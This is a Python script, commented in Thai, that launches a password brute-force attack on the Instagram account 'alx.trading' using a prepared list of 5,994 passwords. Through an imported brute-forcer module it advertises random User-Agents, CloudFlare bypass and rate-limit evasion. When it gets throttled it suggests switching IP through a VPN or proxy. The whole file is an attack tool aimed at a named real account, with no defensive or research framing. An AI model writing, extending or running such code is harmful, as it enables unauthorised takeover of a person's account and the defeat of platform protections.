#!/usr/bin/env python3
"""
สคริปต์เฉพาะสำหรับโจมตี alx.trading
ใช้รายการรหัสผ่าน 5,994 ตัวที่เตรียมไว้
พร้อม adaptive delay และ rate limit protection
"""

import sys
import os
sys.path.append('/workspaces/sugarglitch-realops/scripts')

try:
    from optimized_ig_brute import InstagramBruteForcer, load_password_list

    def main():
        print("🎯 เฉพาะ ALX.TRADING ATTACK")
        print("📋 ใช้รายการรหัสผ่าน 5,994 ตัวที่เตรียมไว้")
        print("=" * 50)

        target_username = "alx.trading"

        # โหลดรหัสผ่านจากไฟล์
        password_file = "/workspaces/sugarglitch-realops/passwords.txt"
        passwords = load_password_list(password_file)

        if not passwords:
            print("❌ ไม่สามารถโหลดรหัสผ่านได้")
            return

        print(f"✅ โหลดรหัสผ่าน {len(passwords):,} ตัวสำเร็จ")

        # แสดงตัวอย่างรหัสผ่าน 10 ตัวแรก
        print("\n🔍 ตัวอย่างรหัสผ่านที่จะลอง:")
        for i, pwd in enumerate(passwords[:10], 1):
            print(f"   {i:2d}. {pwd}")
        print("   ...")

        # ยืนยันก่อนเริ่ม
        confirm = input(
            f"\n⚠️ เริ่มโจมตี {target_username} ด้วย {len(passwords):,} รหัสผ่าน? (y/N): ")

        if confirm.lower() != 'y':
            print("❌ ยกเลิกการโจมตี")
            return

        # เริ่มโจมตี
        brute_forcer = InstagramBruteForcer(target_username)

        print(f"\n🚀 เริ่มการโจมตี alx.trading...")
        print(f"⚙️ การตั้งค่า:")
        print(f"   📋 {len(passwords):,} รหัสผ่าน")
        print(f"   🔄 Adaptive delay 2-30 วินาที")
        print(f"   🎭 Random User-Agent")
        print(f"   🛡️ CloudFlare bypass")
        print(f"   🚨 Rate limit protection")

        success = brute_forcer.brute_force(passwords)

        # สรุปผล
        print(f"\n" + "=" * 60)
        print(f"📊 สรุปการโจมตี alx.trading:")

        if success:
            print(f"🎉 พบรหัสผ่าน: {brute_forcer.found_password}")
            print(f"💾 บันทึกผลลัพธ์ในโฟลเดอร์ results/")
        else:
            print(f"💔 ไม่พบรหัสผ่านที่ถูกต้อง")

        print(f"📈 สถิติ:")
        print(f"   🔢 ลองทั้งหมด: {brute_forcer.attempts:,} ครั้ง")
        print(f"   ❌ ล้มเหลว: {brute_forcer.failed_attempts:,} ครั้ง")
        print(f"   🚨 Rate limit: {brute_forcer.rate_limited} ครั้ง")
        print(
            f"   📊 อัตราสำเร็จ: {(1 if success else 0)/max(1, brute_forcer.attempts)*100:.1f}%")

        if brute_forcer.rate_limited > 5:
            print(f"\n💡 คำแนะนำ: โดน rate limit มาก")
            print(f"   - ลองใช้ VPN หรือเปลี่ยน IP")
            print(f"   - รอหลายชั่วโมงก่อนลองใหม่")
            print(f"   - ใช้ proxy server")

    if __name__ == "__main__":
        main()

except ImportError as e:
    print(f"❌ Import error: {e}")
    print("กรุณาตรวจสอบว่ามี optimized_ig_brute.py")
except Exception as e:
    print(f"❌ Error: {e}")
